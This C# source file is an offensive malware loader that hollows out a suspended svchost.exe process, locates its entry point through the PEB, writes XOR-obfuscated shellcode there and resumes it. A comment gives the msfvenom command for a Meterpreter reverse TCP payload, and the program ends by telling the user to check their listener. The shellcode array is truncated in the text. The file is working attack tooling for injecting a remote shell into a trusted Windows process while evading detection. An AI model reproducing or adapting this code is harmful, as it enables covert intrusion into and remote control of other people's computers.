using System;
using System.Runtime.InteropServices;
class Program
{
    // Define necessary structures
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    // Constants
    const uint CREATE_SUSPENDED = 0x00000004;
    const int ProcessBasicInformation = 0;

    // Function declarations
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        uint processInformationLength,
        ref uint returnLength
    );

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToRead,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToWrite,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern bool NtResumeProcess(IntPtr hThread);

    static void Main()
    {

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // Create process in suspended state
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;

        NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

        byte[] baseAddressBytes = new byte[IntPtr.Size];
        IntPtr nRead;
        NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

        byte[] data = new byte[0x200];
        NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

        uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
        uint entrypointRvaOffset = e_lfanew + 0x28;
        uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

        IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

        // Step 6: Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=ens33 LPORT=443 -f csharp
        // Shellcode XOR'd with key: 0xfa
        byte[] buf = new byte[511] { 0x06, 0xB2...};
       
        
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);

        // Step 8: Resume the thread to execute the shellcode
        NtResumeProcess(pi.hProcess);
        Console.WriteLine("Boom! Check your listener.");

    }
}
